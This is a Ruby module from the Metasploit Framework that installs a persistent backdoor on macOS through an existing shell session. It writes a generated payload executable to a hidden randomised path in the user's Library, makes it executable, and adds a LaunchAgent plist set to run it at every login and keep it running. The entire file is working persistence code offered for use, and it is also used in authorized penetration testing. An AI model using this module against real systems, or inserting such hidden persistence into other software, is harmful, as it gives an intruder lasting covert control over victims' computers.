##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local

  include Msf::Post::Common
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Mac OS X Persistent Payload Installer',
      'Description'   => %q{
        This module provides a persistence boot payload via creating proper entry (plist)
        in LaunchAgents directory for current user.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ "Marcin 'Icewall' Noga  <marcin[at]icewall.pl>", "joev" ],
      'Platform'      => [ 'osx' ],
      'Targets'       => [ [ 'Mac OS X', {} ] ],
      'DefaultTarget' => 0,
      'SessionTypes'  => [ 'shell' ] 
      # no meterpreter support :( since we need to know what cmd to exec (java -jar ...)
    ))

    register_options([
      OptString.new('BACKDOOR_PATH', 
        [true, 'Path to hide to persistent exe on the target.', '/Users/<user>/Library/.<random>/<random>']
      )
    ], self.class)

    register_advanced_options([
      OptPath.new('EXE::Custom',
        [false, 'Use custom exe instead of automatically generating a payload exe']
      )
    ], self.class)
  end

  def run
    # Store backdoor on target machine
    write_backdoor(generate_payload_exe)

    # Add file to LaunchAgents dir
    add_launchctl_item
  end

  private

  # @return [String] an exe containing our payload 
  def generate_payload_exe(opts = {})
    if datastore.include? 'EXE::Custom'
      get_custom_exe
    else
      # Fall back to x86...
      if not opts[:arch] or opts[:arch].length < 1
        opts[:arch] = [ ARCH_X86 ]
      end
      super(opts)
    end
  end

  # used when user has specified EXE::Custom datastore advanced option
  # @return [String] custom exe file, from path specified in EXE::Custom
  def get_custom_exe
    path = datastore['EXE::Custom']
    if path.present?
      print_status("Using custom payload #{path}, other payload settings will be ignored!")
      datastore['DisablePayloadHandler'] = true
      exe = File.read(path)
    end
  end

  # drops the file to disk, then makes it executable
  # @param [String] exe the executable to drop
  def write_backdoor(exe)
    print_status("Dropping backdoor executable...")
    if write_file(backdoor_path, exe)
      print_good("Backdoor stored to #{backdoor_path}")
      cmd_exec("chmod +x #{backdoor_path}")
      # TODO: for java/python/php meterpreter payloads, this won't work.
      # we could add some logic for dropping jar/py/php, then dropping a
      # bash script that invokes java -jar or python or whatever.
      #
      # but really the meterpreter payloads should "know" about this functionality
      # (e.g. they could return a cmd to exec, since that is required)
    else
      fail_with("Error dropping backdoor to #{backdoor_path}")
    end
  end

  # drops a LaunchAgent plist into the user's Library, which specifies to run backdoor_path
  def add_launchctl_item
    label = File.basename(backdoor_path)
    plist_file = label + ".plist"
    plist_path = "/Users/#{user}/Library/LaunchAgents/"
    # just in case...
    cmd_exec("mkdir -p", plist_path)
    # build the plist
    plist_path = plist_path + plist_file
    item = <<-EOI
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
      <dict>
        <key>Label</key>
          <string>#{label}</string>
        <key>Program</key>
          <string>#{backdoor_path}</string>
        <key>ProgramArguments</key>
          <array>
            <string>#{backdoor_path}</string>
          </array>
        <key>RunAtLoad</key>
        <true/>
        <key>KeepAlive</key>
        <true/>
      </dict>
    </plist>
    EOI
    if write_file(plist_path,item)
      print_good("LaunchAgent added: #{plist_path}")
    else
      fail_with("Error writing LaunchAgent item to #{plist_path}")
    end
  end

  # path to upload the backdoor. any <user> or <random> substrings will be replaced.
  # @return [String] path to drop the backdoor payload.
  def backdoor_path
    @backdoor_path ||= (datastore['BACKDOOR_PATH']
      .gsub('<random>'){ Rex::Text.rand_text_alpha(8) }
      .gsub('<user>'){ user })
  end

  # @return [String] username of the session
  def user
    @user ||= cmd_exec('whoami')
  end
end
